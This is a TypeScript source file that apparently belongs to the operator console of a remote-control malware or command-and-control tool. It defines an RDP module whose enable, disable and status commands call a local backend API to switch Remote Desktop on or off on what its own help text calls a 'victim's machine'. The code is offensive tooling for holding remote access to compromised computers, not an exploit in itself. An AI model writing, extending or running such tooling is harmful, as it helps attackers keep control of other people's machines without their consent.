import { Command } from "@/Interfaces/Command";
import { Module } from "@/Interfaces/Module";

const enable: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Enabling RDP for user: " + user.uuid);
            const response = await fetch("http://localhost:8000/api/modules/rdp/activate?id=" + user.uuid, { method: "POST" });
            if(!response.ok) {
                const errorData = await response.json();
                throw new Error(`${errorData.detail || 'Unknown error'}`);
            }
            addOutput("RDP enabled");
        } catch (error: any) {
            console.error("Error enabling RDP:", error);
            addOutput("Error enabling RDP: " + error.message);
        }
    },
    help: "Enable RDP for a victim. Usage: /rdp/enable"
};

const disable: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Disabling RDP for user: " + user.uuid);
            const response = await fetch("http://localhost:8000/api/modules/rdp/deactivate?id=" + user.uuid, { method: "POST" });
            if(!response.ok) {
                const errorData = await response.json();
                throw new Error(`${errorData.detail || 'Unknown error'}`);
            }
            addOutput("RDP disabled");
        } catch (error: any) {
            console.error("Error disabling RDP:", error);
            addOutput("Error disabling RDP: " + error.message);
        }
    },
    help: "Disable RDP for a victim. Usage: /rdp/disable"
};

const status: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Checking RDP status for user: " + user.uuid);
            const response = await fetch("http://localhost:8000/api/modules/rdp/status?id=" + user.uuid);
            if(!response.ok) {
                const errorData = await response.json();
                throw new Error(`${errorData.detail || 'Unknown error'}`);
            }
            const data = await response.json();
            addOutput(data.message);
        } catch (error: any) {
            console.error("Error checking RDP status:", error);
            addOutput("Error checking RDP status: " + error.message);
        }
    },
    help: "Check RDP status for a victim. Usage: /rdp/status"
};

export const rdpModule: Module = {
    commands: {
        enable,
        disable,
        status
    },
    help: `This module is used to interact with the RDP service security on the victim's machine.`
};